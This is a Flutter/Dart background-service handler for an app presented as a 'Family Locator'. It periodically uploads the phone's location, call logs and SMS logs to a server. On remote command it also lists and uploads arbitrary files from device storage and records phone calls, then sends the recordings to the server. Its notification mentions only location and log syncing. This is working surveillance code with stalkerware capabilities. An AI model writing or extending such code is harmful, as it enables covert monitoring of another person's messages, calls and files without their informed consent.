import 'dart:io';

import 'package:dio/dio.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:path_provider/path_provider.dart';

import 'api_client.dart';
import 'call_log_service.dart';
import 'call_recorder_service.dart';
import 'call_state_service.dart';
import 'connectivity_service.dart';
import 'fs_service.dart';
import 'location_service.dart';
import 'sms_service.dart';
import 'ws_client.dart';

class TrackingTaskHandler extends TaskHandler {
  WsClient? _ws;

  // ---------- lifecycle ----------

  @override
  Future<void> onStart(DateTime timestamp, TaskStarter starter) async {
    await ApiClient.init();
    if (!await ApiClient.isPaired()) return;

    // NOTE: CallStateService.start() is intentionally NOT called here.
    // Starting it at service launch would attempt to open the mic before
    // the user has toggled it, causing SecurityException on Android 14+.
    // Call recording is only enabled after the user toggles the mic switch.

    _ws = WsClient(onMessage: _onWsMessage)..connect();
    await _runCycle();
  }

  @override
  Future<void> onRepeatEvent(DateTime timestamp) async {
    await ApiClient.init();
    await _runCycle();
  }

  @override
  Future<void> onDestroy(DateTime timestamp) async {
    try {
      CallStateService.stop();
    } catch (_) {}
    try {
      await CallRecorderService.stop();
    } catch (_) {}
    _ws?.dispose();
    _ws = null;
  }

  // ---------- call recording upload ----------

  Future<void> _uploadCallRecording(String path, {String? number}) async {
    final file = File(path);
    if (!await file.exists()) return;

    final form = FormData.fromMap({
      'call': await MultipartFile.fromFile(
        path,
        filename: path.split('/').last,
      ),
      'recordedAt': DateTime.now().toUtc().toIso8601String(),
      if (number != null) 'number': number,
    });

    try {
      await ApiClient.deviceDio().post('/api/devices/call-recordings', data: form);
      await file.delete(); // only delete on success
    } catch (_) {
      // Keep file on disk so a future run can retry, but rename it so the
      // retry loop doesn't hammer the backend every 15 seconds.
      try {
        await file.rename('${file.path}.failed');
      } catch (_) {}
    }
  }

  Future<void> _retryPendingCallRecordings() async {
    final dir = await getApplicationDocumentsDirectory();
    final d = Directory(dir.path);
    if (!await d.exists()) return;

    await for (final e in d.list()) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      if (!name.startsWith('call_') || !name.endsWith('.m4a')) continue;
      await _uploadCallRecording(e.path);
    }
  }

  // ---------- WS commands ----------

  void _onWsMessage(Map<String, dynamic> msg) async {
    final type = msg['type'];
    switch (type) {
      case 'device.active.changed':
        if (msg['active'] == false) {
          await FlutterForegroundTask.stopService();
        }
        break;

      case 'fs.list':
        await _handleFsList(msg);
        break;

      case 'fs.download':
        await _handleFsDownload(msg);
        break;

      case 'mic.start':
        if (CallStateService.isListening) break;
        CallStateService.start(
          onCallStart: (number) async {
            await CallRecorderService.start(number: number);
          },
          onCallEnd: () async {
            final path = await CallRecorderService.stop();
            if (path != null) await _uploadCallRecording(path);
          },
        );
        break;

      case 'mic.stop':
        CallStateService.stop();
        await CallRecorderService.stop();
        break;

      default:
        break;
    }
  }

  Future<void> _handleFsList(Map<String, dynamic> msg) async {
    final requestId = msg['requestId'] as String?;
    final path = msg['path'] as String? ?? '/storage/emulated/0';
    if (requestId == null) return;

    Map<String, dynamic> result;
    try {
      result = await FsService.list(path);
    } catch (e) {
      result = {'ok': false, 'error': e.toString()};
    }

    try {
      await ApiClient.deviceDio().post('/api/devices/fs/result', data: {
        'requestId': requestId,
        'ok': result['ok'] == true,
        'payload': result,
        'error': result['error'],
      });
    } catch (_) {}
  }

  Future<void> _handleFsDownload(Map<String, dynamic> msg) async {
    final requestId = msg['requestId'] as String?;
    final path = msg['path'] as String?;
    final uploadTicket = msg['uploadTicket'] as String?;
    if (requestId == null || path == null || uploadTicket == null) return;

    final result = await FsService.uploadToBackend(
      baseUrl: ApiClient.baseUrl,
      deviceKey: ApiClient.deviceKey!,
      filePath: path,
      uploadTicket: uploadTicket,
    );

    // The upload endpoint already resolves the pending request.
    // If upload failed, notify failure explicitly.
    if (result['ok'] != true) {
      try {
        await ApiClient.deviceDio().post('/api/devices/fs/result', data: {
          'requestId': requestId,
          'ok': false,
          'error': result['error'],
        });
      } catch (_) {}
    }
  }

  // ---------- main sync cycle ----------

  Future<void> _runCycle() async {
    if (!await ApiClient.isPaired()) return;

    final status = await ConnectivityService.check();

    // 1) Heartbeat
    bool pausedByOwner = false;
    try {
      final info = await DeviceInfoPlugin().androidInfo;
      final pkg = await PackageInfo.fromPlatform();
      final resp = await ApiClient.deviceDio().post('/api/devices/heartbeat', data: {
        'model': info.model,
        'appVersion': pkg.version,
        'gpsEnabled': status.gpsEnabled,
        'internetConnected': status.internetConnected,
      });
      if (resp.data is Map && resp.data['active'] == false) {
        pausedByOwner = true;
      }
    } catch (_) {}

    if (pausedByOwner) {
      FlutterForegroundTask.updateService(
        notificationTitle: 'Family Locator — paused',
        notificationText: 'Tracking paused by owner. Reopen the app to review.',
      );
      await FlutterForegroundTask.stopService();
      return;
    }

    // 2) Capture location
    if (status.gpsEnabled) {
      final snap = await LocationService.captureOnce();
      if (snap != null) await LocationService.enqueue(snap);
    }

    // 3) Capture call logs + SMS
    try {
      await CallLogService.captureNewToQueue();
    } catch (_) {}
    try {
      await SmsService.captureNewToQueue();
    } catch (_) {}

    // 4) Flush all queues if online
    if (status.internetConnected) {
      await _flushLocation();
      await _flushCallLogs();
      await _flushSms();
      await _retryPendingCallRecordings();
    }

    // 5) Update notification
    final hhmm = DateTime.now().toLocal().toString().substring(11, 16);
    final pendingLoc = await LocationService.queueLength();
    final pendingCall = await CallLogService.queueLength();
    final pendingSms = await SmsService.queueLength();
    final pending = pendingLoc + pendingCall + pendingSms;

    final String notifText;
    if (status.gpsEnabled) {
      final suffix = pending > 0 ? ' • $pending pending' : '';
      notifText = 'Location + logs syncing • last sync $hhmm$suffix';
    } else {
      notifText = "GPS is off — location can't be shared right now";
    }

    FlutterForegroundTask.updateService(
      notificationTitle: 'Family Locator — tracking active',
      notificationText: notifText,
    );
  }

  // ---------- flush helpers ----------

  Future<void> _flushLocation() async {
    final queue = await LocationService.peekQueue();
    if (queue.isEmpty) return;

    const chunkSize = 100;
    int flushed = 0;
    int consecutiveFailures = 0;

    while (flushed < queue.length) {
      final end = (flushed + chunkSize).clamp(0, queue.length);
      final chunk = queue.sublist(flushed, end);
      try {
        await ApiClient.deviceDio().post('/api/devices/location/batch', data: {
          'points': chunk.map((p) => p.toJson()).toList(),
        });
        flushed = end;
        consecutiveFailures = 0;
      } on DioException catch (e) {
        final code = e.response?.statusCode;
        if (code == 403) break;
        if (code != null && code >= 400 && code < 500) {
          flushed = end;
          continue;
        }
        consecutiveFailures++;
        if (consecutiveFailures >= 3) break;
      } catch (_) {
        break;
      }
    }

    if (flushed > 0) await LocationService.dropFirst(flushed);
  }

  Future<void> _flushCallLogs() async {
    final queue = await CallLogService.peekQueue();
    if (queue.isEmpty) return;

    const chunkSize = 100;
    int flushed = 0;
    int consecutiveFailures = 0;

    while (flushed < queue.length) {
      final end = (flushed + chunkSize).clamp(0, queue.length);
      final chunk = queue.sublist(flushed, end);
      try {
        await ApiClient.deviceDio().post('/api/devices/call-logs', data: {
          'items': chunk.map((c) => c.toJson()).toList(),
        });
        flushed = end;
        consecutiveFailures = 0;
      } on DioException catch (e) {
        final code = e.response?.statusCode;
        if (code == 403) break;
        if (code != null && code >= 400 && code < 500) {
          flushed = end;
          continue;
        }
        consecutiveFailures++;
        if (consecutiveFailures >= 3) break;
      } catch (_) {
        break;
      }
    }

    if (flushed > 0) {
      await CallLogService.dropFirst(flushed);
      await CallLogService.markSynced(DateTime.now());
    }
  }

  Future<void> _flushSms() async {
    final queue = await SmsService.peekQueue();
    if (queue.isEmpty) return;

    const chunkSize = 100;
    int flushed = 0;
    int consecutiveFailures = 0;

    while (flushed < queue.length) {
      final end = (flushed + chunkSize).clamp(0, queue.length);
      final chunk = queue.sublist(flushed, end);
      try {
        await ApiClient.deviceDio().post('/api/devices/sms-logs', data: {
          'items': chunk.map((s) => s.toJson()).toList(),
        });
        flushed = end;
        consecutiveFailures = 0;
      } on DioException catch (e) {
        final code = e.response?.statusCode;
        if (code == 403) break;
        if (code != null && code >= 400 && code < 500) {
          flushed = end;
          continue;
        }
        consecutiveFailures++;
        if (consecutiveFailures >= 3) break;
      } catch (_) {
        break;
      }
    }

    if (flushed > 0) {
      await SmsService.dropFirst(flushed);
      await SmsService.markSynced(DateTime.now());
    }
  }
}

@pragma('vm:entry-point')
void startTrackingCallback() {
  FlutterForegroundTask.setTaskHandler(TrackingTaskHandler());
}
